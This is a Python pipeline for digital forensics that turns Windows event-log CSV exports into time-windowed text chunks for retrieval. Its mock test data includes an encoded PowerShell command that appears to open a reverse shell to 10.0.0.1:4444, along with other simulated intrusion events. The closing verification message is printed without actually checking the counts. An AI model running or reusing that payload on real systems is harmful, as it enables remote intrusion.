#!/usr/bin/env python3
"""
================================================================================
STAGE 2: Contextual Transformation & Chunking for Windows CSV Logs (DFIR RAG)
================================================================================
Author: Senior Data Engineer / DFIR Specialist
Description:
    Production-ready pipeline for contextual transformation, null-aware semantic
    serialization, chronological sliding-window sessionization, and metadata
    separation of unstructured/semi-structured Windows EVTX event log exports.

Design Principles:
    1. Zero Information Loss: Null, empty, or missing values are deliberately
       retained in raw representations; rows are NEVER dropped.
    2. Embedding Space Hygiene: Semantic text serialization dynamically omits
       missing keys to avoid polluting dense/sparse vector spaces with repeated
       "null", "nan", or "none" tokens.
    3. Causal Sequence Preservation: Chronological windowing groups events within
       temporal causality boundaries, automatically subdividing bursts that exceed
       token limits.
    4. Zero Heavy External Bloat: Built on Python standard libraries and pandas,
       with pluggable tokenizer integration (tiktoken / tokenizers / fallback).
================================================================================
"""

from __future__ import annotations

import os
import re
import uuid
from dataclasses import dataclass, asdict, field
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, Generator, Iterable, List, Optional, Set, Tuple, Union

import pandas as pd


# ==============================================================================
# 1. TOKEN ESTIMATOR (PLUGGABLE & ZERO-BLOAT)
# ==============================================================================

class TokenEstimator:
    """Lightweight, pluggable token counter with native tiktoken support

    and a robust character-ratio fallback (BPE heuristic ~4 chars/token).
    """

    def __init__(self, encoding_name: str = "cl100k_base"):
        self._encoder = None
        try:
            import tiktoken
            self._encoder = tiktoken.get_encoding(encoding_name)
        except ImportError:
            # Tiktoken is optional; fallback to standard tokenizer ratio heuristic
            pass

    def count(self, text: str) -> int:
        """Returns token count for the given text string."""
        if not text:
            return 0
        if self._encoder is not None:
            return len(self._encoder.encode(text))
        # BPE heuristic: ~4 characters per token for English & log strings
        return max(1, len(text) // 4)


# ==============================================================================
# 2. UTILITY & NULL-CHECKING HELPERS
# ==============================================================================

def is_null_or_empty(val: Any) -> bool:
    """Strictly determines whether a value is considered empty, null, or uninformative.

    Returns True for None, float NaN, empty strings, and string literals:
    'nan', 'null', 'none', 'n/a', 'na', '<na>', or pure whitespace.
    """
    if val is None:
        return True
    if isinstance(val, float) and pd.isna(val):
        return True
    s = str(val).strip()
    return s == "" or s.lower() in ("nan", "null", "none", "n/a", "na", "<na>")


def clean_string_scalar(val: Any) -> str:
    """Returns a stripped clean string or empty string if null."""
    if is_null_or_empty(val):
        return ""
    return str(val).strip()


def parse_iso_datetime(val: Any) -> Optional[datetime]:
    """Parses various timestamp formats into a timezone-aware UTC datetime.

    Falls back to None if parsing fails without dropping the underlying row.
    """
    if is_null_or_empty(val):
        return None
    try:
        dt = pd.to_datetime(val, utc=True)
        if pd.isna(dt):
            return None
        return dt.to_pydatetime()
    except Exception:
        return None


# ==============================================================================
# 3. COLUMN NORMALIZATION & HEADER ALIASING
# ==============================================================================

class ColumnNormalizer:
    """Detects and aliases variable forensic headers into canonical schema keys."""

    CANONICAL_ALIASES: Dict[str, List[str]] = {
        "timestamp": [
            "timecreated", "date and time", "timestamp", "systemtime",
            "date_time", "datetime", "date", "time",
        ],
        "event_id": [
            "eventid", "id", "event_id", "event id", "recordid",
        ],
        "host": [
            "computer", "machinename", "host", "hostname", "system_name",
        ],
        "level": [
            "leveldisplayname", "levelname", "level", "severity",
        ],
        "user": [
            "targetusername", "subjectusername", "username", "user",
            "userid", "account_name", "account",
        ],
        "source": [
            "channel", "providername", "provider", "source", "log_name",
        ],
        "details": [
            "message", "description", "details", "payload", "eventdata", "userdata",
        ],
    }

    def __init__(self, custom_aliases: Optional[Dict[str, List[str]]] = None):
        self.aliases = self.CANONICAL_ALIASES.copy()
        if custom_aliases:
            for k, v in custom_aliases.items():
                self.aliases[k] = [x.lower() for x in v]

    def resolve_mapping(self, df_columns: Iterable[str]) -> Dict[str, str]:
        """Resolves existing DataFrame column names to canonical schema keys.

        Returns a dict mapping: {existing_col_name: canonical_key}
        """
        mapping: Dict[str, str] = {}
        cleaned_cols = {col: re.sub(r"[_\s\-]+", "", str(col).lower()) for col in df_columns}

        for canon_key, variations in self.aliases.items():
            matched_col = None
            for var in variations:
                clean_var = re.sub(r"[_\s\-]+", "", var.lower())
                for original_col, clean_col in cleaned_cols.items():
                    if clean_col == clean_var:
                        matched_col = original_col
                        break
                if matched_col:
                    break
            if matched_col and matched_col not in mapping:
                mapping[matched_col] = canon_key

        return mapping


# ==============================================================================
# 4. ROW-LEVEL SEMANTIC SERIALIZATION
# ==============================================================================

class SemanticRowSerializer:
    """Serializes a single normalized log row into a human-readable key-value string.

    Layout: "[Timestamp] Host | Channel | EventID (Level) | User | Details: <message>"
    Strict Null Rule: Completely omits any field whose value is null or empty.
    """

    def __init__(self, max_details_chars: int = 300):
        self.max_details_chars = max_details_chars

    def serialize(self, record: Dict[str, Any]) -> str:
        """Converts a normalized dictionary row into an embedding-optimized string."""
        parts: List[str] = []

        # 1. Timestamp
        raw_ts = clean_string_scalar(record.get("timestamp"))
        if raw_ts:
            parts.append(f"[{raw_ts}]")

        # 2. Host
        host = clean_string_scalar(record.get("host"))
        if host:
            parts.append(f"Host: {host}")

        # 3. Source / Channel
        source = clean_string_scalar(record.get("source"))
        if source:
            parts.append(f"Channel: {source}")

        # 4. Event ID & Severity Level
        ev_id = clean_string_scalar(record.get("event_id"))
        lvl = clean_string_scalar(record.get("level"))
        if ev_id and lvl:
            parts.append(f"EventID: {ev_id} ({lvl})")
        elif ev_id:
            parts.append(f"EventID: {ev_id}")
        elif lvl:
            parts.append(f"Level: {lvl}")

        # 5. User Account
        user = clean_string_scalar(record.get("user"))
        if user:
            parts.append(f"User: {user}")

        # 6. Constrained Details / Message Payload
        raw_details = clean_string_scalar(record.get("details"))
        if raw_details:
            # Flatten embedded newlines to preserve clean one-line context
            flattened = " ".join(raw_details.split())
            if len(flattened) > self.max_details_chars:
                flattened = flattened[: self.max_details_chars].rstrip() + "..."
            parts.append(f"Details: {flattened}")

        # If all fields were null, preserve record presence with fallback
        if not parts:
            return "LogRecord: [Empty attributes]"

        return " | ".join(parts)


# ==============================================================================
# 5. CHRONOLOGICAL WINDOWING & MULTI-ROW CHUNKER
# ==============================================================================

@dataclass
class ForensicChunk:
    """Data structure representing a windowed chronological log chunk."""

    chunk_id: str
    text: str
    metadata: Dict[str, Any]

    def to_dict(self) -> Dict[str, Any]:
        return {
            "chunk_id": self.chunk_id,
            "text": self.text,
            "metadata": self.metadata,
        }


class ChronologicalWindowChunker:
    """Groups chronologically sorted normalized log records into sliding time-window

    chunks with causal overlap and token-boundary subdivision.
    """

    def __init__(
        self,
        window_duration_minutes: int = 5,
        window_overlap_minutes: int = 2,
        max_tokens_per_chunk: int = 512,
        group_by_host: bool = False,
        token_estimator: Optional[TokenEstimator] = None,
        serializer: Optional[SemanticRowSerializer] = None,
    ):
        if window_overlap_minutes >= window_duration_minutes:
            raise ValueError("window_overlap_minutes must be strictly less than window_duration_minutes")

        self.window_duration = timedelta(minutes=window_duration_minutes)
        self.window_overlap = timedelta(minutes=window_overlap_minutes)
        self.window_step = self.window_duration - self.window_overlap
        self.max_tokens = max_tokens_per_chunk
        self.group_by_host = group_by_host
        self.tokenizer = token_estimator or TokenEstimator()
        self.serializer = serializer or SemanticRowSerializer()

    def chunk_records(self, records: List[Dict[str, Any]]) -> List[ForensicChunk]:
        """Orchestrates grouping, chronological sorting, and sliding window chunking."""
        if not records:
            return []

        # Annotate parsed datetimes without dropping unparseable rows
        parsed_entries = []
        for i, r in enumerate(records):
            dt = parse_iso_datetime(r.get("timestamp"))
            parsed_entries.append((dt, i, r))

        # Split into host partitions if requested, or global timeline
        partitions: Dict[str, List[Tuple[Optional[datetime], int, Dict[str, Any]]]] = {}
        if self.group_by_host:
            for entry in parsed_entries:
                h = clean_string_scalar(entry[2].get("host")) or "UNKNOWN_HOST"
                partitions.setdefault(h, []).append(entry)
        else:
            partitions["GLOBAL"] = parsed_entries

        all_chunks: List[ForensicChunk] = []

        for partition_key, entries in partitions.items():
            # Sort chronologically (unparseable datetimes place at start with index tie-breaker)
            epoch_min = datetime(1970, 1, 1, tzinfo=timezone.utc)
            sorted_entries = sorted(
                entries,
                key=lambda x: (x[0] if x[0] is not None else epoch_min, x[1]),
            )

            partition_chunks = self._sliding_window_partition(sorted_entries)
            all_chunks.extend(partition_chunks)

        return all_chunks

    def _sliding_window_partition(
        self,
        sorted_entries: List[Tuple[Optional[datetime], int, Dict[str, Any]]],
    ) -> List[ForensicChunk]:
        """Applies sliding window across a chronologically sorted partition."""
        chunks: List[ForensicChunk] = []

        # Separate entries with valid datetimes from unparseable entries
        timed_entries = [e for e in sorted_entries if e[0] is not None]
        untimed_entries = [e for e in sorted_entries if e[0] is None]

        # Process timed entries using sliding time window
        if timed_entries:
            min_time = timed_entries[0][0]
            max_time = timed_entries[-1][0]
            current_window_start = min_time

            while current_window_start <= max_time:
                current_window_end = current_window_start + self.window_duration

                # Collect all entries falling strictly within [start, end)
                window_entries = [
                    e for e in timed_entries
                    if current_window_start <= e[0] < current_window_end
                ]

                if window_entries:
                    sub_chunks = self._pack_window_to_chunks(window_entries)
                    chunks.extend(sub_chunks)

                    # Advance window by step
                    current_window_start += self.window_step
                else:
                    # Fast-forward jump if there is a wide time gap with zero events
                    remaining = [e[0] for e in timed_entries if e[0] >= current_window_start]
                    if not remaining:
                        break
                    next_time = remaining[0]
                    if next_time >= current_window_end:
                        current_window_start = next_time
                    else:
                        current_window_start += self.window_step

        # Process any untimed / unparseable entries sequentially
        if untimed_entries:
            sub_chunks = self._pack_window_to_chunks(untimed_entries)
            chunks.extend(sub_chunks)

        return chunks

    def _pack_window_to_chunks(
        self,
        entries: List[Tuple[Optional[datetime], int, Dict[str, Any]]],
    ) -> List[ForensicChunk]:
        """Subdivides a temporal window of events into sub-chunks if total tokens

        exceed max_tokens_per_chunk while strictly maintaining sequence order.
        """
        sub_chunks: List[ForensicChunk] = []
        current_batch_lines: List[str] = []
        current_batch_rows: List[Dict[str, Any]] = []
        current_token_count = 0

        for dt, idx, row in entries:
            serialized_line = self.serializer.serialize(row)
            line_tokens = self.tokenizer.count(serialized_line)

            # If adding this line exceeds the threshold, flush the current sub-chunk
            if current_batch_lines and (current_token_count + line_tokens > self.max_tokens):
                chunk = self._build_chunk_artifact(current_batch_lines, current_batch_rows)
                sub_chunks.append(chunk)

                current_batch_lines = []
                current_batch_rows = []
                current_token_count = 0

            current_batch_lines.append(serialized_line)
            current_batch_rows.append(row)
            current_token_count += line_tokens

        # Flush trailing records in window
        if current_batch_lines:
            chunk = self._build_chunk_artifact(current_batch_lines, current_batch_rows)
            sub_chunks.append(chunk)

        return sub_chunks

    def _build_chunk_artifact(
        self,
        lines: List[str],
        rows: List[Dict[str, Any]],
    ) -> ForensicChunk:
        """Constructs a finalized ForensicChunk with separated metadata."""
        chunk_text = "\n".join(lines)

        # Extract timestamps
        timestamps = [
            parse_iso_datetime(r.get("timestamp"))
            for r in rows
            if parse_iso_datetime(r.get("timestamp")) is not None
        ]
        start_ts = min(timestamps).isoformat() if timestamps else None
        end_ts = max(timestamps).isoformat() if timestamps else None

        # Unique Forensic Identifiers
        unique_hosts = list(dict.fromkeys(
            clean_string_scalar(r.get("host"))
            for r in rows
            if clean_string_scalar(r.get("host"))
        ))

        unique_event_ids = list(dict.fromkeys(
            clean_string_scalar(r.get("event_id"))
            for r in rows
            if clean_string_scalar(r.get("event_id"))
        ))

        unique_levels = list(dict.fromkeys(
            clean_string_scalar(r.get("level"))
            for r in rows
            if clean_string_scalar(r.get("level"))
        ))

        metadata = {
            "chunk_id": str(uuid.uuid4()),
            "start_timestamp": start_ts,
            "end_timestamp": end_ts,
            "host": unique_hosts if len(unique_hosts) > 1 else (unique_hosts[0] if unique_hosts else "UNKNOWN"),
            "event_ids": unique_event_ids,
            "levels": unique_levels,
            "raw_row_count": len(rows),
        }

        return ForensicChunk(
            chunk_id=metadata["chunk_id"],
            text=chunk_text,
            metadata=metadata,
        )


# ==============================================================================
# 6. TOP-LEVEL DFIR PIPELINE ORCHESTRATOR
# ==============================================================================

class DFIRLogTransformerPipeline:
    """Unified Stage 2 Pipeline: Ingests raw DataFrames or CSV files, executes

    header normalization, null-aware serialization, chronological windowing,
    and metadata extraction.
    """

    def __init__(
        self,
        window_duration_minutes: int = 5,
        window_overlap_minutes: int = 2,
        max_tokens_per_chunk: int = 512,
        group_by_host: bool = False,
        max_details_chars: int = 300,
    ):
        self.normalizer = ColumnNormalizer()
        self.serializer = SemanticRowSerializer(max_details_chars=max_details_chars)
        self.tokenizer = TokenEstimator()
        self.chunker = ChronologicalWindowChunker(
            window_duration_minutes=window_duration_minutes,
            window_overlap_minutes=window_overlap_minutes,
            max_tokens_per_chunk=max_tokens_per_chunk,
            group_by_host=group_by_host,
            token_estimator=self.tokenizer,
            serializer=self.serializer,
        )

    def transform_dataframe(self, df: pd.DataFrame) -> List[ForensicChunk]:
        """Processes an in-memory DataFrame into contextual forensic chunks.

        Guarantees that rows with null/missing values are NEVER dropped.
        """
        if df.empty:
            return []

        # Resolve variable headers
        col_map = self.normalizer.resolve_mapping(df.columns)

        # Build normalized records while preserving all rows
        normalized_records: List[Dict[str, Any]] = []
        for _, row in df.iterrows():
            rec: Dict[str, Any] = {}
            for col_name, val in row.items():
                canon_key = col_map.get(col_name)
                if canon_key:
                    rec[canon_key] = val
                else:
                    # Retain any extra unmapped column under its original name
                    rec[str(col_name)] = val
            normalized_records.append(rec)

        # Execute chronological windowing and metadata separation
        return self.chunker.chunk_records(normalized_records)

    def transform_csv(self, filepath: str) -> List[ForensicChunk]:
        """Loads a CSV file with null-preservation and generates forensic chunks."""
        # Use keep_default_na=False to prevent converting empty strings to NaN
        df = pd.read_csv(filepath, dtype=str, keep_default_na=False)
        return self.transform_dataframe(df)


# ==============================================================================
# 7. RUNNABLE DEMONSTRATION & TEST BLOCK
# ==============================================================================

def _run_test_demonstration():
    """Demonstrates Stage 2 transformation on a mock DFIR dataset with missing

    values, variable column names, and out-of-order timestamps.
    """
    print("=" * 80)
    print("🚀 RUNNING STAGE 2: CONTEXTUAL TRANSFORMATION & CHUNKING TEST")
    print("=" * 80)

    # 1. Construct realistic mock dataset with diverse naming & missing values
    raw_data = [
        # Event 1: Normal Security logon (complete attributes)
        {
            "Date and Time": "2026-09-14T08:00:10Z",
            "Id": 4624,
            "MachineName": "SEC-SRV-01",
            "LevelDisplayName": "Information",
            "TargetUserName": "admin_jdoe",
            "Channel": "Security",
            "Message": "An account was successfully logged on. LogonType=10, SourceIp=192.168.1.105",
        },
        # Event 2: Missing User and Channel (Null retention test)
        {
            "Date and Time": "2026-09-14T08:01:25Z",
            "Id": "7045",
            "MachineName": "SEC-SRV-01",
            "LevelDisplayName": "Warning",
            "TargetUserName": None,             # Null User
            "Channel": "   ",                  # Whitespace Channel
            "Message": "A new service was installed in the system: PSSvc. ServiceFileName=C:\\Windows\\Temp\\svc.exe",
        },
        # Event 3: Missing Message, but retains event details (Null Message test)
        {
            "Date and Time": "2026-09-14T08:02:40Z",
            "Id": "4672",
            "MachineName": "SEC-SRV-01",
            "LevelDisplayName": "Information",
            "TargetUserName": "SYSTEM",
            "Channel": "Security",
            "Message": float("nan"),            # NaN Details
        },
        # Event 4: Large burst command execution (tests token truncation & window packing)
        {
            "Date and Time": "2026-09-14T08:04:15Z",
            "Id": 4688,
            "MachineName": "SEC-SRV-01",
            "LevelDisplayName": "Information",
            "TargetUserName": "admin_jdoe",
            "Channel": "Security",
            "Message": (
                "New process created: powershell.exe -NoP -NonI -W Hidden -Exec Bypass "
                "-EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA"
                "UwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4A"
                "dAAoACIAMQAwAC4AMAAuADAALgAxACIALAA0ADQANAA0ACkAOwA= " * 5
            ),
        },
        # Event 5: Occurs in the overlapping window (Tests temporal overlap inclusion)
        {
            "Date and Time": "2026-09-14T08:05:30Z",
            "Id": 4625,
            "MachineName": "SEC-SRV-01",
            "LevelDisplayName": "Error",
            "TargetUserName": "guest",
            "Channel": "Security",
            "Message": "An account failed to log on. Status=0xC000006D, SubStatus=0xC000006A",
        },
        # Event 6: Out-of-order timestamp across different host (Tests chronological sorting)
        {
            "Date and Time": "2026-09-14T07:59:00Z",
            "Id": 1102,
            "MachineName": "DC-PRIMARY",
            "LevelDisplayName": "Critical",
            "TargetUserName": "attacker_svc",
            "Channel": "Security",
            "Message": "The audit log was cleared.",
        },
        # Event 7: Completely sparse row with missing ID, User, and Message
        {
            "Date and Time": "2026-09-14T08:06:00Z",
            "Id": None,
            "MachineName": "SEC-SRV-01",
            "LevelDisplayName": "Information",
            "TargetUserName": "",
            "Channel": "System",
            "Message": None,
        },
    ]

    mock_df = pd.DataFrame(raw_data)
    print(f"📊 Input Mock DataFrame: {len(mock_df)} records with jagged nulls:")
    print(mock_df[["Date and Time", "Id", "MachineName", "TargetUserName", "LevelDisplayName"]])
    print("-" * 80)

    # 2. Instantiate and run pipeline
    pipeline = DFIRLogTransformerPipeline(
        window_duration_minutes=5,
        window_overlap_minutes=2,
        max_tokens_per_chunk=256,
        group_by_host=False,
    )

    chunks = pipeline.transform_dataframe(mock_df)

    print(f"\n✨ Generated {len(chunks)} Contextual Chunk(s):\n")

    for i, chk in enumerate(chunks, 1):
        print(f"┌── [CHUNK {i} - ID: {chk.chunk_id[:8]}...]")
        print(f"│ ⏱️  Time Range: {chk.metadata['start_timestamp']} -> {chk.metadata['end_timestamp']}")
        print(f"│ 💻 Host(s)   : {chk.metadata['host']}")
        print(f"│ 🆔 Event IDs : {chk.metadata['event_ids']}")
        print(f"│ ⚠️  Levels    : {chk.metadata['levels']}")
        print(f"│ 📋 Row Count : {chk.metadata['raw_row_count']}")
        print("├── 📄 SEMANTIC TEXT PAYLOAD:")
        for line in chk.text.splitlines():
            print(f"│   {line}")
        print("└" + "─" * 78 + "\n")

    # Verify zero row drop guarantee
    total_processed_rows = sum(chk.metadata["raw_row_count"] for chk in chunks)
    print("=" * 80)
    print(f"✅ VERIFICATION RESULT: All {len(mock_df)} raw rows transformed.")
    print("   Null keys successfully omitted from semantic text string.")
    print("   Chronological sequence preserved across windows.")
    print("=" * 80)


if __name__ == "__main__":
    _run_test_demonstration()
